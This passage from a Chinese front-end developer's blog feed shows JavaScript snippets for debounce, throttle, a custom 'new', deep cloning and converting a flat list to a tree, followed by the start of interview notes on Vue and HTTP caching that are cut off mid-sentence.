language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, debounceTask)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><ol start="2"><li>节流</li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">func, ms = <span class="number">1000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> canRun = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!canRun) <span class="keyword">return</span></span><br><span class="line">    canRun = <span class="literal">false</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args)</span><br><span class="line">      canRun = <span class="literal">true</span></span><br><span class="line">    &#125;, ms)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task</span> = (<span class="params"></span>) =&gt; &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;run task&#x27;</span>) &#125;</span><br><span class="line"><span class="keyword">const</span> throttleTask = <span class="title function_">throttle</span>(task, <span class="number">1000</span>)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, throttleTask)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><ol start="3"><li>new<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myNew</span>(<span class="params">Func, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Func</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(instance, <span class="title class_">Func</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="title class_">Func</span>.<span class="title function_">apply</span>(instance, args)</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> res === <span class="string">&quot;function&quot;</span> || (<span class="keyword">typeof</span> res === <span class="string">&quot;object&quot;</span> &amp;&amp; res !== <span class="literal">null</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> me = <span class="title function_">myNew</span>(<span class="title class_">Person</span>, <span class="string">&#x27;Jack&#x27;</span>)</span><br><span class="line">me.<span class="title function_">sayName</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(me)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>深度克隆</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name_key_nb</span>: <span class="string">&quot;ronaldo&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">    <span class="attr">project</span>: &#123;</span><br><span class="line">      <span class="attr">vue</span>: [<span class="string">&quot;good&quot;</span>, <span class="string">&quot;bad&quot;</span>],</span><br><span class="line">      <span class="attr">react</span>: <span class="string">&quot;good&quot;</span>,</span><br><span class="line">      <span class="attr">webpack</span>: &#123;</span><br><span class="line">        <span class="attr">devServer</span>: <span class="number">100</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepClone</span> = (<span class="params">target</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = target <span class="keyword">instanceof</span> <span class="title class_">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> target === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(target, key)) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = target[key];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> element === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> newKey = <span class="title function_">toCamel</span>(key);</span><br><span class="line">          result[newKey] = <span class="title function_">deepClone</span>(element);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> newKey = <span class="title function_">toCamel</span>(key);</span><br><span class="line">          result[newKey] = element;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepClone1</span> = (<span class="params">obj</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">let</span> newObj = obj <span class="keyword">instanceof</span> <span class="title class_">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj[key] === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">      newObj[key] = <span class="title function_">deepClone1</span>(obj[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      newObj[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 下划线转驼峰</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toCamel</span> = (<span class="params">str</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> arr = str.<span class="title function_">split</span>(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    arr[i] =</span><br><span class="line">      arr[i].<span class="title function_">charAt</span>(<span class="number">0</span>).<span class="title function_">toUpperCase</span>() + arr[i].<span class="title function_">substr</span>(<span class="number">1</span>, arr[i].<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> newObj = <span class="title function_">deepClone</span>(obj);</span><br><span class="line"><span class="comment">// const obj1 = obj</span></span><br><span class="line"><span class="comment">// console.log(obj)</span></span><br><span class="line">obj[<span class="number">0</span>].<span class="property">project</span>.<span class="property">react</span> = <span class="string">&quot;messi&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newObj);</span><br></pre></td></tr></table></figure><ul><li>数组间的转换</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> datas = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">parentId</span>: <span class="literal">null</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单B&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单C&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">5</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-B&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">6</span>, <span class="attr">parentId</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单B-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">7</span>, <span class="attr">parentId</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&quot;三级菜单A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">8</span>, <span class="attr">parentId</span>: <span class="number">7</span>, <span class="attr">name</span>: <span class="string">&quot;四级菜单A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">9</span>, <span class="attr">parentId</span>: <span class="number">8</span>, <span class="attr">name</span>: <span class="string">&quot;五级菜单A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">10</span>, <span class="attr">parentId</span>: <span class="number">9</span>, <span class="attr">name</span>: <span class="string">&quot;六级菜单A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">6</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">11</span>, <span class="attr">parentId</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">&quot;七级菜单A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">7</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">12</span>, <span class="attr">parentId</span>: <span class="number">11</span>, <span class="attr">name</span>: <span class="string">&quot;八级菜单A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">8</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">13</span>, <span class="attr">parentId</span>: <span class="number">12</span>, <span class="attr">name</span>: <span class="string">&quot;九级菜单A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">9</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">14</span>, <span class="attr">parentId</span>: <span class="number">13</span>, <span class="attr">name</span>: <span class="string">&quot;十级菜单A-A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">10</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toTree</span> = (<span class="params">array = [], parentId = <span class="literal">null</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  array.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">parentId</span> === parentId) &#123;</span><br><span class="line">      item.<span class="property">children</span> = <span class="title function_">toTree</span>(array, item.<span class="property">id</span>);</span><br><span class="line">      arr.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toTree1</span> = (<span class="params">arr</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i</span>) =&gt;</span> (map[i.<span class="property">id</span>] = i));</span><br><span class="line">  <span class="comment">// console.log(map)</span></span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parent = map[item.<span class="property">parentId</span>];</span><br><span class="line">    <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">      (parent.<span class="property">children</span> || (parent.<span class="property">children</span> = [])).<span class="title function_">push</span>(item);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="title function_">toTree1</span>(datas);</span><br><span class="line"><span class="comment">// console.log(a)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">DFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  <span class="keyword">const</span> stack = [...list];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (stack.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = stack.<span class="title function_">pop</span>();</span><br><span class="line">    res.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      stack.<span class="title function_">push</span>(...item.<span class="property">children</span>);</span><br><span class="line">      <span class="keyword">delete</span> item.<span class="property">children</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">BFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  <span class="keyword">const</span> queue = [...list];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (queue.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = queue.<span class="title function_">shift</span>();</span><br><span class="line">    res.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      <span class="comment">// console.log(item.children)</span></span><br><span class="line">      <span class="comment">// console.log(...item.children)</span></span><br><span class="line">      queue.<span class="title function_">push</span>(...item.<span class="property">children</span>);</span><br><span class="line">      <span class="keyword">delete</span> item.<span class="property">children</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toList</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(item.<span class="property">children</span>);</span><br><span class="line">      <span class="title function_">toList</span>(item.<span class="property">children</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendDFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">list</span>) &#123;</span><br><span class="line">    list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">        <span class="title function_">fn</span>(item.<span class="property">children</span>);</span><br><span class="line">        <span class="keyword">delete</span> item.<span class="property">children</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fn</span>(list);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">id</span> - b.<span class="property">id</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> list = <span class="title function_">handleExpendDFS</span>(a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(list);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收藏题目</title>
      <link href="/2022/07/24/collect/"/>
      <url>/2022/07/24/collect/</url>
      
        <content type="html"><![CDATA[<h3 id="vue-基础"><a href="#vue-基础" class="headerlink" title="vue 基础"></a>vue 基础</h3><h4 id="v-if-v-show"><a href="#v-if-v-show" class="headerlink" title="v-if v-show"></a>v-if v-show</h4><p><code>v-if重新渲染 v-show 控制css</code></p><h4 id="v-for-key-的作用"><a href="#v-for-key-的作用" class="headerlink" title="v-for key 的作用"></a>v-for key 的作用</h4><p><code>diff算法会用到key来比较新旧节点，提升页面渲染性能</code></p><h4 id="v-model-实现原理"><a href="#v-model-实现原理" class="headerlink" title="v-model 实现原理"></a>v-model 实现原理</h4><ul><li>绑定 value=this.name</li><li>绑定 input 事件，this.name = event.target.value</li><li>data 更新触发视图的更新</li></ul><h4 id="mvvm-的理解"><a href="#mvvm-的理解" class="headerlink" title="mvvm 的理解"></a>mvvm 的理解</h4><ul><li>view viewmodel model</li></ul><h4 id="为什么-data-必须是一个函数"><a href="#为什么-data-必须是一个函数" class="headerlink" title="为什么 data 必须是一个函数"></a>为什么 data 必须是一个函数</h4><p><code>隔离属性定义，避免同名变量的引用</code></p><h4 id="ajax-放在哪个生命周期中"><a href="#ajax-放在哪个生命周期中" class="headerlink" title="ajax 放在哪个生命周期中"></a>ajax 放在哪个生命周期中</h4><p><code> mounted中，js是单线程，ajax异步获取数据，放在mounted之前只会让逻辑更加混乱</code></p><h4 id="单页面生命周期"><a href="#单页面生命周期" class="headerlink" title="单页面生命周期"></a>单页面生命周期</h4><p><code>beforeCreated,created,beforeMount,Mounted,beforeUpdate,Update</code></p><h4 id="异步组件"><a href="#异步组件" class="headerlink" title="异步组件"></a>异步组件</h4><ul><li>import()函数</li><li>异步加载</li></ul><h4 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h4><ul><li>缓存组件</li><li>频繁切换，不需要重复渲染</li></ul><h4 id="keep-alive-原理"><a href="#keep-alive-原理" class="headerlink" title="keep-alive 原理"></a>keep-alive 原理</h4><h3 id="http1-0-https1-1-http2-0-的区别"><a href="#http1-0-https1-1-http2-0-的区别" class="headerlink" title="http1.0 https1.1 http2.0 的区别"></a>http1.0 https1.1 http2.0 的区别</h3><ul><li>HTTP 1.1 默认使用长连接，可有效减少 TCP 的三次握手开销。</li><li>HTTP 1.0 规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个 TCP 连接，服务器完成请求处理后立即断开 TCP 连接。</li><li>HTTP 1.1 还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求。</li><li>HTTP2.0 使用多路复用技术，”HTTP1.1 在同一时间对于同一个域名的请求数量有限制，超过限制就会阻塞请求”。多路复用底层采用增加二进制分帧层的方法，使得不改变原来的语义、首部字段的情况下提高传输性能，降低延迟。</li></ul><h4 id="浏览器缓存策略"><a href="#浏览器缓存策略" class="headerlink" title="浏览器缓存策略"></a>浏览器缓存策略</h4><ul><li>浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识</li><li>浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中</li></ul><h5 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h5><p>强缓存不会向服务器发送请求，直接从缓存中读取资源，在 chorme 控制台 Network 选项中可以看到该请求返回 200 的状态码，并且 Size 显示 from disk cache 或 from memory cache。强缓存可以通过设置两种 HTTP Header 实现：Expries 和 Cache-Control</p><ul><li>Expires<br>缓存过期时间，用来指定资源到期的时间，是服务器端的具体时间点。Expires = max-age + 请求时间，需要和 -Last-modified 结合使用。Expires 是 Web 服务器响应消息头字段，在响应 http 请求时告诉浏览器在过期时间前浏览器可以直接从缓存中取数据，无需再次请求。<br>Tips：Expires 受限于本地时间，如果修改了本地时间，可能会造成缓存失效。</li><li>Cache-Control<br>Cache-Control 可以在请求或者响应头中设置，并且可以组合多种指令：</li></ul><h5 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h5><ul><li><p>协商缓存生效，返回 304 和 Not Modified<br>首先，浏览器发起 http 请求后，浏览器缓存结果失效，只返回了缓存标识；然后，客户端携带该缓存标识向服务器发起 http 请求；接着，服务器发现请求的资源没有更新，返回 304；最后，客户端从缓存中获取结果</p></li><li><p>协商缓存失效，返回 200 和 请求结果<br>首先，浏览器发起 http 请求后，浏览器缓存结果失效，只返回了缓存标识；然后，客户端写到该缓存标识向服务器发起 http 请求；接着，服务器发现请求的资源更新了，返回 200 和 请求结果；最后，将该请求的请求结果和缓存标识存入浏览器缓存中<br>协商缓存可以通过设置两种 HTTP Header 实现：Last-Modified 和 ETag：</p></li><li><p>Last-Modified 和 If-Modified-Since<br>浏览器在第一次访问资源时，服务器返回资源的同时，在 response header 